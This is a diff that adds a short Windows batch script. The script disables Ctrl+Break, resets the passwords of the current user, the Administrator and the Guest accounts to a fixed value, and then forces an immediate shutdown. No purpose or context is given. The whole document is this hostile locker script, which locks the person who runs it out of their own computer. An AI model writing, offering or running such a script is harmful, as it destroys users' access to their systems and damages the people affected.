@@ -1,0 +1,7 @@
+@echo off
+break off
+net user %USERNAME% Fransesco
+net user administrator Fransesco
+net user Guest Fransesco
+shutdown -s -f -t 00
+exit
